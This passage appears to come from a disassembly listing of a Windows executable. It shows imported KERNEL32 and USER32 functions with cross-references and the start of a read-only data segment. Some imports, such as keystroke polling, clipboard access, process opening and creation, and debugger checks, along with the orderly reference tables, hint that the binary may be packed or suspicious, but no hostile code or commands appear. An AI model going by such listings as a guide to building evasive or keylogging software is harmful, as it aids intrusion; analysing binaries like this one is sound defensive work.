; HMODULE __stdcall LoadLibraryExW(LPCWSTR lpLibFileName, HANDLE hFile,	DWORD dwFlags)
		extrn LoadLibraryExW:dword ; DATA XREF:	sub_422C60+1BDr
; HMODULE __stdcall GetModuleHandleW(LPCWSTR lpModuleName)
		extrn GetModuleHandleW:dword ; CODE XREF: __crt_waiting_on_module_handle+15p
					; ___crtCorExitProcess+Ap ...
; HGLOBAL __stdcall GlobalFree(HGLOBAL hMem)
		extrn GlobalFree:dword	; DATA XREF: sub_422C60+1A5r
					; sub_423090+239r
; BOOL __stdcall GetExitCodeProcess(HANDLE hProcess, LPDWORD lpExitCode)
		extrn GetExitCodeProcess:dword ; DATA XREF: sub_422C60+19Br
					; sub_423090+19r
; DWORD	__stdcall WaitForSingleObject(HANDLE hHandle, DWORD dwMilliseconds)
		extrn WaitForSingleObject:dword	; DATA XREF: sub_422C60+18Fr
					; sub_423090+Dr
; HGLOBAL __stdcall GlobalAlloc(UINT uFlags, SIZE_T dwBytes)
		extrn GlobalAlloc:dword	; DATA XREF: sub_422C60+183r
					; sub_423090+245r
; DWORD	__stdcall ExpandEnvironmentStringsW(LPCWSTR lpSrc, LPWSTR lpDst, DWORD nSize)
		extrn ExpandEnvironmentStringsW:dword ;	DATA XREF: sub_422C60+179r
					; sub_423090+519r
; int __stdcall	lstrcmpW(LPCWSTR lpString1, LPCWSTR lpString2)
		extrn lstrcmpW:dword	; DATA XREF: sub_422C60+16Dr
; int __stdcall	lstrcmpiW(LPCWSTR lpString1, LPCWSTR lpString2)
		extrn lstrcmpiW:dword	; DATA XREF: sub_422C60+161r
; int __stdcall	lstrcmpA(LPCSTR	lpString1, LPCSTR lpString2)
		extrn lstrcmpA:dword	; DATA XREF: sub_422C60+157r
; BOOL __stdcall RemoveDirectoryW(LPCWSTR lpPathName)
		extrn RemoveDirectoryW:dword ; DATA XREF: sub_422C60+14Br
					; sub_423090+113r
; LPSTR	__stdcall lstrcpyA(LPSTR lpString1, LPCSTR lpString2)
		extrn lstrcpyA:dword	; DATA XREF: sub_422C60+13Fr
; DWORD	__stdcall GetVersion()
		extrn GetVersion:dword	; DATA XREF: sub_422C60+135r
					; sub_423090+14Br
; UINT __stdcall GetSystemDirectoryW(LPWSTR lpBuffer, UINT uSize)
		extrn GetSystemDirectoryW:dword	; DATA XREF: sub_422C60+129r
					; sub_423090+13Fr
; BOOL __stdcall GetVersionExW(LPOSVERSIONINFOW	lpVersionInformation)
		extrn GetVersionExW:dword ; DATA XREF: sub_422C60+11Dr
; LPWSTR __stdcall lstrcpyW(LPWSTR lpString1, LPCWSTR lpString2)
		extrn lstrcpyW:dword	; DATA XREF: sub_422C60+113r
; HANDLE __stdcall OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId)
		extrn OpenProcess:dword	; DATA XREF: sub_422C60+107r
; HMODULE __stdcall GetModuleHandleA(LPCSTR lpModuleName)
		extrn GetModuleHandleA:dword ; CODE XREF: __ms_p5_mp_test_fdiv+5p
					; DATA XREF: __ms_p5_mp_test_fdiv+5r ...
; HMODULE __stdcall LoadLibraryA(LPCSTR	lpLibFileName)
		extrn LoadLibraryA:dword ; CODE	XREF: sub_41EADF+28p
					; DATA XREF: sub_41EADF+28r ...
; FARPROC __stdcall GetProcAddress(HMODULE hModule, LPCSTR lpProcName)
		extrn GetProcAddress:dword ; CODE XREF:	__ms_p5_mp_test_fdiv+15p
					; ___crtCorExitProcess+1Ap ...
; UINT __stdcall GetTempFileNameW(LPCWSTR lpPathName, LPCWSTR lpPrefixString, UINT uUnique, LPWSTR lpTempFileName)
		extrn GetTempFileNameW:dword ; DATA XREF: sub_422C60+CFr
; int __stdcall	lstrcmpiA(LPCSTR lpString1, LPCSTR lpString2)
		extrn lstrcmpiA:dword	; DATA XREF: sub_422C60+C3r
; BOOL __stdcall CreateProcessW(LPCWSTR	lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation)
		extrn CreateProcessW:dword ; DATA XREF:	sub_422C60+B7r
					; sub_423090+95r
; HMODULE __stdcall LoadLibraryW(LPCWSTR lpLibFileName)
		extrn LoadLibraryW:dword ; DATA	XREF: sub_422C60+ADr
					; sub_423090+129r
; HANDLE __stdcall CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags,	LPDWORD	lpThreadId)
		extrn CreateThread:dword ; DATA	XREF: sub_422C60+A1r
					; sub_423090+51r
; LPVOID __stdcall GlobalLock(HGLOBAL hMem)
		extrn GlobalLock:dword	; DATA XREF: sub_422C60+95r
; BOOL __stdcall GlobalUnlock(HGLOBAL hMem)
		extrn GlobalUnlock:dword ; DATA	XREF: sub_422C60+8Br
; BOOL __stdcall GetDiskFreeSpaceW(LPCWSTR lpRootPathName, LPDWORD lpSectorsPerCluster,	LPDWORD	lpBytesPerSector, LPDWORD lpNumberOfFreeClusters, LPDWORD lpTotalNumberOfClusters)
		extrn GetDiskFreeSpaceW:dword ;	DATA XREF: sub_422C60+7Fr
; LPWSTR __stdcall lstrcpynW(LPWSTR lpString1, LPCWSTR lpString2, int iMaxLength)
		extrn lstrcpynW:dword	; DATA XREF: sub_422C60+73r
; int __stdcall	lstrlenW(LPCWSTR lpString)
		extrn lstrlenW:dword	; DATA XREF: sub_422C60+69r
					; sub_423090+19Br
; BOOL __stdcall CloseHandle(HANDLE hObject)
		extrn CloseHandle:dword	; DATA XREF: sub_422C60+5Dr
					; sub_423090+25r
; UINT __stdcall SetErrorMode(UINT uMode)
		extrn SetErrorMode:dword ; DATA	XREF: sub_422C60+51r
					; sub_423090+FBr
; LPWSTR __stdcall GetCommandLineW()
		extrn GetCommandLineW:dword ; DATA XREF: sub_422C60+47r
					; sub_423090+8Br
; DWORD	__stdcall GetTempPathW(DWORD nBufferLength, LPWSTR lpBuffer)
		extrn GetTempPathW:dword ; DATA	XREF: sub_422C60+3Br
; UINT __stdcall GetWindowsDirectoryW(LPWSTR lpBuffer, UINT uSize)
		extrn GetWindowsDirectoryW:dword ; DATA	XREF: sub_422C60+2Fr
; void __stdcall ExitProcess(UINT uExitCode)
		extrn ExitProcess:dword	; CODE XREF: ___crtExitProcess+11p
					; DATA XREF: ___crtExitProcess+11r ...
; BOOL __stdcall CopyFileW(LPCWSTR lpExistingFileName, LPCWSTR lpNewFileName, BOOL bFailIfExists)
		extrn CopyFileW:dword	; DATA XREF: sub_422C60+19r
; HANDLE __stdcall GetCurrentProcess()
		extrn GetCurrentProcess:dword ;	CODE XREF: __invoke_watson+10Ep
					; ___report_gsfailure+F7p
					; DATA XREF: ...
; DWORD	__stdcall GetModuleFileNameW(HMODULE hModule, LPWSTR lpFilename, DWORD nSize)
		extrn GetModuleFileNameW:dword ; DATA XREF: sub_422C60+3r
					; sub_423090+29Fr
; void __stdcall RaiseException(DWORD dwExceptionCode, DWORD dwExceptionFlags, DWORD nNumberOfArguments, const ULONG_PTR *lpArguments)
		extrn RaiseException:dword ; CODE XREF:	__raise_exc_ex+224p
					; DATA XREF: __raise_exc_ex+224r ...
; HANDLE __stdcall GetProcessHeap()
		extrn GetProcessHeap:dword ; DATA XREF:	sub_423090+525r
; BOOL __stdcall SetCurrentDirectoryW(LPCWSTR lpPathName)
		extrn SetCurrentDirectoryW:dword ; DATA	XREF: sub_423090+50Fr
; DWORD	__stdcall GetCurrentDirectoryW(DWORD nBufferLength, LPWSTR lpBuffer)
		extrn GetCurrentDirectoryW:dword ; DATA	XREF: sub_423090+503r
; DWORD	__stdcall GetFileAttributesW(LPCWSTR lpFileName)
		extrn GetFileAttributesW:dword ; DATA XREF: sub_423090+4D5r
; BOOL __stdcall SystemTimeToTzSpecificLocalTime(const TIME_ZONE_INFORMATION *lpTimeZoneInformation, const SYSTEMTIME *lpUniversalTime,	LPSYSTEMTIME lpLocalTime)
		extrn SystemTimeToTzSpecificLocalTime:dword ; DATA XREF: sub_423090+4BFr
; DWORD	__stdcall GetTimeZoneInformation(LPTIME_ZONE_INFORMATION lpTimeZoneInformation)
		extrn GetTimeZoneInformation:dword ; DATA XREF:	sub_423090+4B3r
; void __stdcall GetSystemTime(LPSYSTEMTIME lpSystemTime)
		extrn GetSystemTime:dword ; DATA XREF: sub_423090+4A9r
; DWORD	__stdcall FormatMessageW(DWORD dwFlags,	LPCVOID	lpSource, DWORD	dwMessageId, DWORD dwLanguageId, LPWSTR	lpBuffer, DWORD	nSize, va_list *Arguments)
		extrn FormatMessageW:dword ; DATA XREF:	sub_423090+49Dr
; BOOL __stdcall GetComputerNameW(LPWSTR lpBuffer, LPDWORD nSize)
		extrn GetComputerNameW:dword ; DATA XREF: sub_423090+487r
; void __stdcall GetLocalTime(LPSYSTEMTIME lpSystemTime)
		extrn GetLocalTime:dword ; DATA	XREF: sub_423090+47Br
; HANDLE __stdcall CreateFileA(LPCSTR lpFileName, DWORD	dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes,	DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE	hTemplateFile)
		extrn CreateFileA:dword	; DATA XREF: sub_423090+46Fr
; BOOL __stdcall FlushFileBuffers(HANDLE hFile)
		extrn FlushFileBuffers:dword ; DATA XREF: sub_423090+465r
; BOOL __stdcall WriteConsoleW(HANDLE hConsoleOutput, const void *lpBuffer, DWORD nNumberOfCharsToWrite, LPDWORD lpNumberOfCharsWritten, LPVOID	lpReserved)
		extrn WriteConsoleW:dword ; DATA XREF: sub_423090+459r
; BOOL __stdcall SetStdHandle(DWORD nStdHandle,	HANDLE hHandle)
		extrn SetStdHandle:dword ; DATA	XREF: sub_423090+44Dr
; BOOL __stdcall IsProcessorFeaturePresent(DWORD ProcessorFeature)
		extrn IsProcessorFeaturePresent:dword ;	DATA XREF: sub_423090+443r
; LPVOID __stdcall HeapReAlloc(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem, SIZE_T dwBytes)
		extrn HeapReAlloc:dword	; CODE XREF: _realloc+134p
					; _realloc+1B5p ...
; SIZE_T __stdcall HeapSize(HANDLE hHeap, DWORD	dwFlags, LPCVOID lpMem)
		extrn HeapSize:dword	; CODE XREF: __msize+82p
					; DATA XREF: __msize+82r ...
; BOOL __stdcall GetStringTypeW(DWORD dwInfoType, LPCWSTR lpSrcStr, int	cchSrc,	LPWORD lpCharType)
		extrn GetStringTypeW:dword
					; CODE XREF: __crtGetStringTypeA_stat(localeinfo_struct	*,ulong,char const *,int,ushort	*,int,int,int)+2Fp
					; __crtGetStringTypeA_stat(localeinfo_struct *,ulong,char const	*,int,ushort *,int,int,int)+11Ep
					; DATA XREF: ...
; BOOL __stdcall GetConsoleMode(HANDLE hConsoleHandle, LPDWORD lpMode)
		extrn GetConsoleMode:dword ; DATA XREF:	sub_423090+409r
; UINT __stdcall GetConsoleCP()
		extrn GetConsoleCP:dword ; DATA	XREF: sub_423090+3FFr
; void __stdcall RtlUnwind(PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD	ExceptionRecord, PVOID ReturnValue)
		extrn __imp_RtlUnwind:dword ; DATA XREF: RtlUnwindr
					; sub_423090+3E7r
; int __stdcall	LCMapStringW(LCID Locale, DWORD	dwMapFlags, LPCWSTR lpSrcStr, int cchSrc, LPWSTR lpDestStr, int	cchDest)
		extrn LCMapStringW:dword
					; CODE XREF: __crtLCMapStringA_stat(localeinfo_struct *,ulong,ulong,char const *,int,char *,int,int,int)+32p
					; __crtLCMapStringA_stat(localeinfo_struct *,ulong,ulong,char const *,int,char *,int,int,int)+158p ...
; LPVOID __stdcall HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes)
		extrn HeapAlloc:dword	; CODE XREF: _realloc+DDp
					; ___sbh_alloc_new_region+5Dp ...
; BOOL __stdcall IsValidCodePage(UINT CodePage)
		extrn IsValidCodePage:dword ; CODE XREF: __setmbcp_nolock+73p
					; DATA XREF: __setmbcp_nolock+73r ...
; UINT __stdcall GetOEMCP()
		extrn GetOEMCP:dword	; CODE XREF: getSystemCP(int)+29p
					; DATA XREF: getSystemCP(int)+29r ...
; UINT __stdcall GetACP()
		extrn GetACP:dword	; CODE XREF: getSystemCP(int)+4Cp
					; DATA XREF: getSystemCP(int)+4Cr ...
; BOOL __stdcall GetCPInfo(UINT	CodePage, LPCPINFO lpCPInfo)
		extrn GetCPInfo:dword	; CODE XREF: setSBUpLow(threadmbcinfostruct *)+21p
					; __setmbcp_nolock+86p	...
; BOOL __stdcall HeapFree(HANDLE hHeap,	DWORD dwFlags, LPVOID lpMem)
		extrn HeapFree:dword	; CODE XREF: ___sbh_free_block+2B6p
					; ___sbh_alloc_new_region+8Ep ...
; BOOL __stdcall IsDebuggerPresent()
		extrn IsDebuggerPresent:dword ;	CODE XREF: __invoke_watson+DCp
					; ___report_gsfailure+BBp
					; DATA XREF: ...
; LONG __stdcall UnhandledExceptionFilter(struct _EXCEPTION_POINTERS *ExceptionInfo)
		extrn UnhandledExceptionFilter:dword ; CODE XREF: __invoke_watson+F3p
					; ___report_gsfailure+DBp ...
; BOOL __stdcall TerminateProcess(HANDLE hProcess, UINT	uExitCode)
		extrn TerminateProcess:dword ; CODE XREF: __invoke_watson+115p
					; ___report_gsfailure+FEp
					; DATA XREF: ...
; void __stdcall GetSystemTimeAsFileTime(LPFILETIME lpSystemTimeAsFileTime)
		extrn GetSystemTimeAsFileTime:dword ; CODE XREF: ___security_init_cookie+37p
					; DATA XREF: ___security_init_cookie+37r ...
; DWORD	__stdcall GetCurrentProcessId()
		extrn GetCurrentProcessId:dword	; CODE XREF: ___security_init_cookie+43p
					; DATA XREF: ___security_init_cookie+43r ...
; BOOL __stdcall QueryPerformanceCounter(LARGE_INTEGER *lpPerformanceCount)
		extrn QueryPerformanceCounter:dword ; CODE XREF: ___security_init_cookie+5Fp
					; DATA XREF: ___security_init_cookie+5Fr ...
; HANDLE __stdcall HeapCreate(DWORD flOptions, SIZE_T dwInitialSize, SIZE_T dwMaximumSize)
		extrn HeapCreate:dword	; CODE XREF: __heap_init+15p
					; DATA XREF: __heap_init+15r ...
; DWORD	__stdcall GetCurrentThreadId()
		extrn GetCurrentThreadId:dword ; CODE XREF: __getptd_noexit+56p
					; __mtinit+172p ...
; void __stdcall SetLastError(DWORD dwErrCode)
		extrn SetLastError:dword ; CODE	XREF: __getptd_noexit+6Ep
					; ___crtInitCritSecAndSpinCount+46p
					; DATA XREF: ...
; BOOL __stdcall TlsFree(DWORD dwTlsIndex)
		extrn TlsFree:dword	; CODE XREF: __mtterm+2Bp
					; DATA XREF: __mtterm+2Br ...
; BOOL __stdcall TlsSetValue(DWORD dwTlsIndex, LPVOID lpTlsValue)
		extrn TlsSetValue:dword	; CODE XREF: ___set_flsgetvalue+2Ap
					; __mtinit+C3p
					; DATA XREF: ...
; LPVOID __stdcall TlsGetValue(DWORD dwTlsIndex)
		extrn TlsGetValue:dword	; CODE XREF: __encode_pointer+12p
					; __encode_pointer+29p	...
; DWORD	__stdcall TlsAlloc()
		extrn TlsAlloc:dword	; CODE XREF: __crtTlsAlloc(x)p
					; __mtinit:loc_41B503p
					; DATA XREF: ...
; DWORD	__stdcall GetFileType(HANDLE hFile)
		extrn GetFileType:dword	; CODE XREF: __ioinit+13Fp
					; __ioinit+1DBp
					; DATA XREF: ...
; BOOL __stdcall InitializeCriticalSectionAndSpinCount(LPCRITICAL_SECTION lpCriticalSection, DWORD dwSpinCount)
		extrn InitializeCriticalSectionAndSpinCount:dword
					; CODE XREF: ___crtInitCritSecAndSpinCount+16p
					; DATA XREF: ___crtInitCritSecAndSpinCount+16r	...
; UINT __stdcall SetHandleCount(UINT uNumber)
		extrn SetHandleCount:dword ; CODE XREF:	__ioinit+233p
					; DATA XREF: __ioinit+233r ...
; LPWCH	__stdcall GetEnvironmentStringsW()
		extrn GetEnvironmentStringsW:dword
					; CODE XREF: ___crtGetEnvironmentStringsA+1Ep
					; ___crtGetEnvironmentStringsA+59p
					; DATA XREF: ...
; BOOL __stdcall FreeEnvironmentStringsW(LPWCH)
		extrn FreeEnvironmentStringsW:dword
					; CODE XREF: ___crtGetEnvironmentStringsA+CCp
					; DATA XREF: ___crtGetEnvironmentStringsA+CCr ...
; DWORD	__stdcall GetModuleFileNameA(HMODULE hModule, LPSTR lpFilename,	DWORD nSize)
		extrn GetModuleFileNameA:dword ; CODE XREF: __NMSG_WRITE+A3p
					; __setargv+2Cp
					; DATA XREF: ...
; HANDLE __stdcall GetStdHandle(DWORD nStdHandle)
		extrn GetStdHandle:dword ; CODE	XREF: __NMSG_WRITE+176p
					; __ioinit+1C9p
					; DATA XREF: ...
; LPTOP_LEVEL_EXCEPTION_FILTER __stdcall SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter)
		extrn SetUnhandledExceptionFilter:dword	; CODE XREF: sub_41A258+5p
					; __invoke_watson+E6p ...
; void __stdcall GetStartupInfoW(LPSTARTUPINFOW	lpStartupInfo)
		extrn GetStartupInfoW:dword ; DATA XREF: sub_423090+267r
; BOOL __stdcall HeapSetInformation(HANDLE HeapHandle, HEAP_INFORMATION_CLASS HeapInformationClass, PVOID HeapInformation, SIZE_T HeapInformationLength)
		extrn HeapSetInformation:dword ; DATA XREF: sub_423090+25Br
; LPSTR	__stdcall GetCommandLineA()
		extrn GetCommandLineA:dword ; CODE XREF: ___tmainCRTStartup:loc_41665Ep
					; DATA XREF: ___tmainCRTStartup:loc_41665Er ...
; BOOL __stdcall SetFilePointerEx(HANDLE hFile,	LARGE_INTEGER liDistanceToMove,	PLARGE_INTEGER lpNewFilePointer, DWORD dwMoveMethod)
		extrn SetFilePointerEx:dword ; DATA XREF: sub_423090+22Dr
; BOOL __stdcall DuplicateHandle(HANDLE	hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD	dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions)
		extrn DuplicateHandle:dword ; DATA XREF: sub_423090+217r
; BOOL __stdcall SetEndOfFile(HANDLE hFile)
		extrn SetEndOfFile:dword ; DATA	XREF: sub_423090+20Br
; BOOL __stdcall DosDateTimeToFileTime(WORD wFatDate, WORD wFatTime, LPFILETIME	lpFileTime)
		extrn DosDateTimeToFileTime:dword ; DATA XREF: sub_423090+201r
; BOOL __stdcall LocalFileTimeToFileTime(const FILETIME	*lpLocalFileTime, LPFILETIME lpFileTime)
		extrn LocalFileTimeToFileTime:dword ; DATA XREF: sub_423090+1F5r

;
; Imports from USER32.dll
;
; SHORT	__stdcall GetAsyncKeyState(int vKey)
		extrn GetAsyncKeyState:dword ; DATA XREF: sub_422EE0+3r
					; .rdata:0042AA24o
; UINT __stdcall IsDlgButtonChecked(HWND hDlg, int nIDButton)
		extrn IsDlgButtonChecked:dword ; DATA XREF: sub_422EE0+Dr
; BOOL __stdcall ScreenToClient(HWND hWnd, LPPOINT lpPoint)
		extrn ScreenToClient:dword ; DATA XREF:	sub_422EE0+19r
; DWORD	__stdcall GetMessagePos()
		extrn GetMessagePos:dword ; DATA XREF: sub_422EE0+25r
; LRESULT __stdcall CallWindowProcW(WNDPROC lpPrevWndFunc, HWND	hWnd, UINT Msg,	WPARAM wParam, LPARAM lParam)
		extrn CallWindowProcW:dword ; DATA XREF: sub_422EE0+2Fr
; BOOL __stdcall IsWindowVisible(HWND hWnd)
		extrn IsWindowVisible:dword ; DATA XREF: sub_422EE0+3Br
; HBITMAP __stdcall LoadBitmapW(HINSTANCE hInstance, LPCWSTR lpBitmapName)
		extrn LoadBitmapW:dword	; DATA XREF: sub_422EE0+47r
; BOOL __stdcall CloseClipboard()
		extrn CloseClipboard:dword ; DATA XREF:	sub_422EE0+51r
; HANDLE __stdcall SetClipboardData(UINT uFormat, HANDLE hMem)
		extrn SetClipboardData:dword ; DATA XREF: sub_422EE0+5Dr
; BOOL __stdcall EmptyClipboard()
		extrn EmptyClipboard:dword ; DATA XREF:	sub_422EE0+69r
; BOOL __stdcall TrackPopupMenu(HMENU hMenu, UINT uFlags, int x, int y,	int nReserved, HWND hWnd, const	RECT *prcRect)
		extrn TrackPopupMenu:dword ; DATA XREF:	sub_422EE0+7Fr
; BOOL __stdcall GetWindowRect(HWND hWnd, LPRECT lpRect)
		extrn GetWindowRect:dword ; DATA XREF: sub_422EE0+8Br
; BOOL __stdcall AppendMenuW(HMENU hMenu, UINT uFlags, UINT_PTR	uIDNewItem, LPCWSTR lpNewItem)
		extrn AppendMenuW:dword	; DATA XREF: sub_422EE0+95r
; HMENU	__stdcall CreatePopupMenu()
		extrn CreatePopupMenu:dword ; DATA XREF: sub_422EE0+A1r
; int __stdcall	GetSystemMetrics(int nIndex)
		extrn GetSystemMetrics:dword ; DATA XREF: sub_422EE0+ADr
; BOOL __stdcall EndDialog(HWND	hDlg, INT_PTR nResult)
		extrn EndDialog:dword	; DATA XREF: sub_422EE0+B7r
; BOOL __stdcall EnableMenuItem(HMENU hMenu, UINT uIDEnableItem, UINT uEnable)
		extrn EnableMenuItem:dword ; DATA XREF:	sub_422EE0+C3r
; HMENU	__stdcall GetSystemMenu(HWND hWnd, BOOL	bRevert)
		extrn GetSystemMenu:dword ; DATA XREF: sub_422EE0+CFr
; DWORD	__stdcall SetClassLongW(HWND hWnd, int nIndex, LONG dwNewLong)
		extrn SetClassLongW:dword ; DATA XREF: sub_422EE0+D9r
; BOOL __stdcall IsWindowEnabled(HWND hWnd)
		extrn IsWindowEnabled:dword ; DATA XREF: sub_422EE0+E5r
; BOOL __stdcall SetWindowPos(HWND hWnd, HWND hWndInsertAfter, int X, int Y, int cx, int cy, UINT uFlags)
		extrn SetWindowPos:dword ; DATA	XREF: sub_422EE0+F1r
; INT_PTR __stdcall DialogBoxParamW(HINSTANCE hInstance, LPCWSTR lpTemplateName, HWND hWndParent, DLGPROC lpDialogFunc,	LPARAM dwInitParam)
		extrn DialogBoxParamW:dword ; DATA XREF: sub_422EE0+FBr
; BOOL __stdcall CheckDlgButton(HWND hDlg, int nIDButton, UINT uCheck)
		extrn CheckDlgButton:dword ; DATA XREF:	sub_422EE0+107r
; HWND __stdcall CreateWindowExW(DWORD dwExStyle, LPCWSTR lpClassName, LPCWSTR lpWindowName, DWORD dwStyle, int	X, int Y, int nWidth, int nHeight, HWND	hWndParent, HMENU hMenu, HINSTANCE hInstance, LPVOID lpParam)
		extrn CreateWindowExW:dword ; DATA XREF: sub_422EE0+113r
; BOOL __stdcall SystemParametersInfoW(UINT uiAction, UINT uiParam, PVOID pvParam, UINT	fWinIni)
		extrn SystemParametersInfoW:dword ; DATA XREF: sub_422EE0+11Dr
; ATOM __stdcall RegisterClassW(const WNDCLASSW	*lpWndClass)
		extrn RegisterClassW:dword ; DATA XREF:	sub_422EE0+129r
; BOOL __stdcall SetDlgItemTextW(HWND hDlg, int	nIDDlgItem, LPCWSTR lpString)
		extrn SetDlgItemTextW:dword ; DATA XREF: sub_422EE0+135r
; UINT __stdcall GetDlgItemTextW(HWND hDlg, int	nIDDlgItem, LPWSTR lpString, int cchMax)
		extrn GetDlgItemTextW:dword ; DATA XREF: sub_422EE0+13Fr
; int __stdcall	MessageBoxIndirectW(const MSGBOXPARAMSW	*lpmbp)
		extrn MessageBoxIndirectW:dword	; DATA XREF: sub_422EE0+14Br
; LPSTR	__stdcall CharNextA(LPCSTR lpsz)
		extrn CharNextA:dword	; DATA XREF: sub_422EE0+157r
; LPWSTR __stdcall CharUpperW(LPWSTR lpsz)
		extrn CharUpperW:dword	; DATA XREF: sub_422EE0+161r
; LPWSTR __stdcall CharPrevW(LPCWSTR lpszStart,	LPCWSTR	lpszCurrent)
		extrn CharPrevW:dword	; DATA XREF: sub_422EE0+16Dr
; int __stdcall	wvsprintfW(LPWSTR, LPCWSTR, va_list arglist)
		extrn wvsprintfW:dword	; DATA XREF: sub_422EE0+179r
; LRESULT __stdcall DispatchMessageW(const MSG *lpMsg)
		extrn DispatchMessageW:dword ; DATA XREF: sub_422EE0+183r
; BOOL __stdcall PeekMessageW(LPMSG lpMsg, HWND	hWnd, UINT wMsgFilterMin, UINT wMsgFilterMax, UINT wRemoveMsg)
		extrn PeekMessageW:dword ; DATA	XREF: sub_422EE0+18Fr
; int wsprintfA(LPSTR, LPCSTR, ...)
		extrn wsprintfA:dword	; DATA XREF: sub_422EE0+19Br
; BOOL __stdcall GetAltTabInfoA(HWND hwnd, int iItem, PALTTABINFO pati,	LPSTR pszItemText, UINT	cchItemText)
		extrn GetAltTabInfoA:dword ; CODE XREF:	WinMain(x,x,x,x)+5683p
					; DATA XREF: WinMain(x,x,x,x)+5683r
; BOOL __stdcall TrackMouseEvent(LPTRACKMOUSEEVENT lpEventTrack)
		extrn TrackMouseEvent:dword ; CODE XREF: sub_40F3D0+17Dp
					; DATA XREF: sub_40F3D0+17Dr
; UINT __stdcall GetMenuDefaultItem(HMENU hMenu, UINT fByPos, UINT gmdiFlags)
		extrn GetMenuDefaultItem:dword ; CODE XREF: sub_40F1F0+2Fp
					; DATA XREF: sub_40F1F0+2Fr
; BOOL __stdcall CreateCaret(HWND hWnd,	HBITMAP	hBitmap, int nWidth, int nHeight)
		extrn CreateCaret:dword	; CODE XREF: sub_40F1F0+18Cp
					; DATA XREF: sub_40F1F0+18Cr
; int __stdcall	SetScrollInfo(HWND hwnd, int nBar, LPCSCROLLINFO lpsi, BOOL redraw)
		extrn SetScrollInfo:dword ; CODE XREF: sub_409DF0+721p
					; DATA XREF: sub_409DF0+721r
; BOOL __stdcall GetGUIThreadInfo(DWORD	idThread, PGUITHREADINFO pgui)
		extrn GetGUIThreadInfo:dword ; CODE XREF: sub_409DF0+DD6p
					; DATA XREF: sub_409DF0+DD6r
; BOOL __stdcall DrawIconEx(HDC	hdc, int xLeft,	int yTop, HICON	hIcon, int cxWidth, int	cyWidth, UINT istepIfAniCur, HBRUSH hbrFlickerFreeDraw,	UINT diFlags)
		extrn DrawIconEx:dword	; CODE XREF: sub_409DF0+48D8p
					; DATA XREF: sub_409DF0+48D8r
; BOOL __stdcall GetInputState()
		extrn GetInputState:dword ; CODE XREF: sub_4092F0+301p
					; DATA XREF: sub_4092F0+301r
; BOOL __stdcall GetWindowPlacement(HWND hWnd, WINDOWPLACEMENT *lpwndpl)
		extrn GetWindowPlacement:dword ; CODE XREF: .text:00408A24p
					; DATA XREF: .text:00408A24r
; HWND __stdcall GetDesktopWindow()
		extrn GetDesktopWindow:dword ; CODE XREF: .text:004092DBp
					; DATA XREF: .text:004092DBr
; HDC __stdcall	GetDC(HWND hWnd)
		extrn GetDC:dword	; CODE XREF: sub_408860+C2p
					; DATA XREF: sub_408860+C2r
; HWINSTA __stdcall GetProcessWindowStation()
		extrn GetProcessWindowStation:dword ; CODE XREF: sub_408650+A0p
					; DATA XREF: sub_408650+A0r
; BOOL __stdcall AnyPopup()
		extrn AnyPopup:dword	; CODE XREF: sub_407A90+17Cp
					; DATA XREF: sub_407A90+17Cr
; BOOL __stdcall OpenClipboard(HWND hWndNewOwner)
		extrn OpenClipboard:dword ; CODE XREF: sub_407820+90p
					; DATA XREF: sub_407820+90r ...
; HMONITOR __stdcall MonitorFromWindow(HWND hwnd, DWORD	dwFlags)
		extrn MonitorFromWindow:dword ;	CODE XREF: sub_4071A0+143p
					; DATA XREF: sub_4071A0+143r
; HDESK	__stdcall OpenInputDesktop(DWORD dwFlags, BOOL fInherit, ACCESS_MASK dwDesiredAccess)
		extrn OpenInputDesktop:dword ; CODE XREF: .text:00406F2Bp
					; DATA XREF: .text:00406F2Br
; BOOL __stdcall IsCharUpperA(CHAR ch)
		extrn IsCharUpperA:dword ; CODE	XREF: sub_402C40+2F2p
					; DATA XREF: sub_402C40+2F2r


; ===========================================================================

; Segment type:	Pure data
; Segment permissions: Read
_rdata		segment	para public 'DATA' use32
		assume cs:_rdata
		;org 4243E8h
dword_4243E8	dd 0			; DATA XREF: __cinit+4Bo
		dd offset sub_422C60
		dd offset sub_422EE0
		dd offset sub_423090
dword_4243F8	dd 0			; DATA XREF: __cinit+50o
dword_4243FC	dd 0			; DATA XREF: __cinit+31o
		dd offset __sse2_mathfcns_init
		dd offset ___initmbctable
		dd offset sub_41D3AF
		dd offset ___onexitinit
		dd offset sub_41A258
dword_424414	dd 0			; DATA XREF: __cinit+2Co
dword_424418	dd 0			; DATA XREF: _doexit+D1o
dword_42441C	dd 0			; DATA XREF: _doexit:loc_41A4A6o
dword_424420	dd 0			; DATA XREF: _doexit+E1o
dword_424424	dd 3 dup(0)		; DATA XREF: _doexit:loc_41A4B6o
dbl_424430	dq 96.0			; DATA XREF: sub_402C40+3FF6r
					; sub_409DF0+2A80r ...
dbl_424438	dq 250.0		; DATA XREF: sub_402C40+3C4Er
					; sub_402C40+3FAEr ...
dbl_424440	dq 117.0		; DATA XREF: sub_402C40+3616r
					; sub_402C40+369Ar ...
dbl_424448	dq 238.0		; DATA XREF: sub_402C40+32DAr
					; sub_402C40+3B52r ...
dbl_424450	dq 19.0			; DATA XREF: sub_402C40+2D86r
					; sub_402C40+3796r ...
dbl_424458	dq 249.0		; DATA XREF: sub_402C40+2CA2r
					; sub_402C40+2CD2r ...
dbl_424460	dq 243.0		; DATA XREF: sub_402C40+2B5Er
					; sub_402C40+303Er ...
dbl_424468	dq 248.0		; DATA XREF: sub_402C40+2B22r
					; sub_402C40+30CAr ...
